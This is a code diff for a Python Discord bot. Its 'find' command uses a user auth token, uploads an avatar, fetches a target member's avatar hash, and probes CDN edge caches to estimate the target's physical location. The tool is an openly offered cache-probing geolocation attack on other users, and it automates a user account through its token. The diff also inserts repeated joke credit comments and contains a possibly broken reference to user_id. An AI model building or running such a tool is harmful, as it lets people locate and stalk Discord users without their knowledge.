@@ -15,7 +15,7 @@ CLOUDFLARE_EDGES = [
     "https://cdn-discordapp-com.global.ssl.fastly.net",
     "https://discordapp-cdn-xyz.cloudflare.com",
 ]
-
+#made by @waltersspecialmethamphetamine on github
 CLOUDFLARE_LOCATIONS = {
     "cdn.discordapp.com": (37.7749, -122.4194),  # San Francisco
     "cdn-discordapp-com.global.ssl.fastly.net": (52.5200, 13.4050),  # Berlin
@@ -51,7 +51,7 @@ def upload_avatar():
     
     headers = {"Authorization": USER_AUTH_TOKEN}
     url = "https://discord.com/api/v9/users/@me"
-
+#made by @waltersspecialmethamphetamine on github
     response = requests.patch(url, headers=headers, files=files)
 
     if response.status_code == 200:
@@ -75,17 +75,13 @@ def send_friend_request(user_id):
 # ==========================
 # 🔹 Get User Avatar Hash
 # ==========================
-def get_avatar_hash(username):
-    url = f"https://discord.com/api/v9/users/@me"
+def get_avatar_hash(user_id):
+    url = f"https://discord.com/api/v9/users/{user_id}"
     headers = {"Authorization": USER_AUTH_TOKEN}
     response = requests.get(url, headers=headers).json()
-
-    user_id = response.get("id")
+#made by @waltersspecialmethamphetamine on github
     avatar_hash = response.get("avatar")
-    
-    if user_id and avatar_hash:
-        return user_id, avatar_hash
-    return None, None
+    return avatar_hash if avatar_hash else None
 
 # ==========================
 # 🔹 Check Cloudflare CDN Cache
@@ -120,7 +116,7 @@ def estimate_location(cache_results):
                     if dist < min_distance:
                         min_distance = dist
                         closest_location = edge_location
-
+#made by @waltersspecialmethamphetamine on github
     return closest_location
 
 # ==========================
@@ -147,7 +143,7 @@ async def find(ctx, member: discord.Member):
     await ctx.send("✅ Avatar updated.")
 
     # Step 3: Get avatar hash
-    user_id, avatar_hash = get_avatar_hash(member.name)
+    avatar_hash = get_avatar_hash(user_id)
     if not avatar_hash:
         await ctx.send("❌ Could not retrieve avatar hash.")
         return
